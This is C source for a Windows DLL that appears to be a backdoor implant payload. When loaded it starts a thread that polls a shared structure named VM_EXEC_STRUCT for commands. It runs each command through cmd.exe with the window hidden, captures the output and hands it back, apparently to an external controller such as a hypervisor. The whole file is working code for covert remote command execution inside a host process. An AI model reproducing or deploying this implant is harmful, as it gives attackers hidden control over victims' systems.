#include "stdafx.h"

#pragma comment(linker, "/ENTRY:DllMain")

// run_command() read buffer length
#define COMMAND_BUFF_LEN 0x100

// run_command() timeout in milliseconds
#define COMMAND_TIMEOUT (10 * 1000)

VM_EXEC_STRUCT m_vm_exec;
//--------------------------------------------------------------------------------------
uint32_t run_command(char *command, void **output_buff_addr, uint32_t *output_size_addr)
{
    HANDLE con_input = NULL, input = NULL;
    HANDLE con_output = NULL, output = NULL;
    uint32_t ret = VM_EXEC_CTL_ERROR, start_time = GetTickCount();
    uint32_t output_size = PAGE_SIZE, curr_output_size = 0;

    PROCESS_INFORMATION process_info;
    STARTUPINFO startup_info;

    ZeroMemory(&process_info, sizeof(process_info));
    ZeroMemory(&startup_info, sizeof(startup_info));
    
    void *output_buff = VirtualAlloc(NULL, output_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (output_buff == NULL)
    {
        DbgMsg(__FILE__, __LINE__, "VirtualAlloc() ERROR %d\n", GetLastError());
        goto _end;
    }

    ZeroMemory(output_buff, output_size);

    char *command_line = (char *)M_ALLOC(lstrlen(command) + MAX_PATH);
    if (command_line == NULL)
    {
        DbgMsg(__FILE__, __LINE__, "M_ALLOC() ERROR %d\n", GetLastError());
        goto _end;
    }    

    wsprintf(command_line, "cmd.exe /C \"%s\"", command);

    SECURITY_ATTRIBUTES sec_attr;
    sec_attr.lpSecurityDescriptor = NULL;
    sec_attr.nLength = sizeof(sec_attr);
    sec_attr.bInheritHandle = TRUE;

    if (!CreatePipe(&con_input, &input, &sec_attr, 0))
    {
        DbgMsg(__FILE__, __LINE__, "CreatePipe() ERROR %d\n", GetLastError());
        goto _end;
    }

    if (!CreatePipe(&output, &con_output, &sec_attr, 0))
    {
        DbgMsg(__FILE__, __LINE__, "CreatePipe() ERROR %d\n", GetLastError());
        goto _end;
    }

    startup_info.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    startup_info.wShowWindow = FALSE;
    startup_info.hStdError = startup_info.hStdOutput = con_output;
    startup_info.hStdInput = con_input;

    // run proccess
    if (CreateProcess(NULL, command_line, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &startup_info, &process_info))
    {        
        DWORD exit_code = 0;

        DbgMsg(
            __FILE__, __LINE__, __FUNCTION__"(): Process %d started, command = \"%s\"\n",
            process_info.dwProcessId, command_line
        );

        while (true)
        {
            uint8_t buff[COMMAND_BUFF_LEN];
            DWORD bytes_read = 0, bytes_available = 0;            

            // check if there is any data in the pipe to read
            if (!PeekNamedPipe(output, NULL, NULL, NULL, &bytes_available, NULL))
            {
                DbgMsg(__FILE__, __LINE__, "PeekNamedPipe() ERROR %d\n", GetLastError());
                break;
            }

            if (bytes_available == 0)
            {
                if (GetExitCodeProcess(process_info.hProcess, &exit_code))
                {
                    if (exit_code != STILL_ACTIVE)
                    {
                        break;
                    }
                }
                else
                {
                    DbgMsg(__FILE__, __LINE__, "GetExitCodeProcess() ERROR %d\n", GetLastError());
                    break;
                }

                if (GetTickCount() - start_time >= COMMAND_TIMEOUT)
                {
                    DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Timeout occurred\n");
                    break;
                }

                SwitchToThread();
                continue;
            }

            if (!ReadFile(output, buff, min(sizeof(buff), bytes_available), &bytes_read, NULL))
            {
                DbgMsg(__FILE__, __LINE__, "ReadFile() ERROR %d\n", GetLastError());
                break;
            }

            if (bytes_read == 0)
            {
                continue;
            }
            
            if (curr_output_size + bytes_read >= output_size)
            {               
                output_size = _ALIGN_UP(curr_output_size + bytes_read, PAGE_SIZE);

                // allocate new output buffer
                void *output_buff_new = VirtualAlloc(NULL, output_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
                if (output_buff_new == NULL)
                {
                    DbgMsg(__FILE__, __LINE__, "VirtualAlloc() ERROR %d\n", GetLastError());
                    break;
                }

                ZeroMemory(output_buff_new, output_size);
                CopyMemory(output_buff_new, output_buff, curr_output_size);
                
                // free previous output buffer
                VirtualFree(output_buff, 0, MEM_RELEASE);
                output_buff = output_buff_new;
            }

            CopyMemory(RVATOVA(output_buff, curr_output_size), buff, bytes_read);
            curr_output_size += bytes_read;
        }

        if (GetExitCodeProcess(process_info.hProcess, &exit_code))
        {
            if (exit_code == STILL_ACTIVE)
            {
                // terminate command shell process if it's still active
                if (!TerminateProcess(process_info.hProcess, 0))
                {
                    DbgMsg(__FILE__, __LINE__, "TerminateProcess() ERROR %d\n", GetLastError());
                }

                DbgMsg(
                    __FILE__, __LINE__, __FUNCTION__"(): Process %d was terminated by timeout\n",
                    process_info.dwProcessId
                );

                ret = VM_EXEC_CTL_TIMEOUT;
            }
            else
            {
                DbgMsg(
                    __FILE__, __LINE__, __FUNCTION__"(): Process %d ended, exit code = 0x%.8x\n",
                    process_info.dwProcessId, exit_code
                );

                ret = VM_EXEC_CTL_DONE;
            }
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, "GetExitCodeProcess() ERROR %d\n", GetLastError());
        }
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "CreateProcess() ERROR %d\n", GetLastError());
    }

_end:

    if (process_info.hProcess)
    {
        CloseHandle(process_info.hProcess);
    }

    if (process_info.hThread)
    {
        CloseHandle(process_info.hThread);
    }

    if (output)
    {
        CloseHandle(output);
    }

    if (con_output)
    {
        CloseHandle(con_output);
    }

    if (input)
    {
        CloseHandle(input);
    }

    if (con_input)
    {
        CloseHandle(con_input);
    }

    if (command_line)
    {
        M_FREE(command_line);
    }

    if (ret == VM_EXEC_CTL_ERROR && output_buff)
    {
        VirtualFree(output_buff, 0, MEM_RELEASE);
    }
    else
    {
        *output_buff_addr = output_buff;
        *output_size_addr = output_size;
    }

    return ret;
}
//--------------------------------------------------------------------------------------
DWORD WINAPI main_thread(void *param)
{
    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Waiting for the commands...\n");

    while (true)
    {
        if (m_vm_exec.control == VM_EXEC_CTL_RUNING)
        {
            if (m_vm_exec.output)
            {
                // free previous command output
                VirtualFree(m_vm_exec.output, 0, MEM_RELEASE);
                
                m_vm_exec.output = NULL;
                m_vm_exec.output_size = 0;
            }

            // execute command command
            m_vm_exec.control = run_command(m_vm_exec.command, &m_vm_exec.output, &m_vm_exec.output_size);
        }

        Sleep(1000);
    }

    return 0;
}
//--------------------------------------------------------------------------------------
void main_run(void)
{
    char process_path[MAX_PATH];

    // obtain process executable path
    GetModuleFileName(GetModuleHandle(NULL), process_path, MAX_PATH);

    DbgMsg(
        __FILE__, __LINE__, __FUNCTION__"(): Running in process \"%s\", PID = %d\n",
        process_path, GetCurrentProcessId()
    );

    // run command execution thread
    HANDLE thread = CreateThread(NULL, 0, main_thread, NULL, 0, NULL);
    if (thread)
    {
        CloseHandle(thread);
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "CreateThread() ERROR %d\n", GetLastError());
    }
}
//--------------------------------------------------------------------------------------
BOOL APIENTRY DllMain(
    HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:

        main_run();
        break;

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:

        break;
    }

    return TRUE;
}
//--------------------------------------------------------------------------------------
// EoF
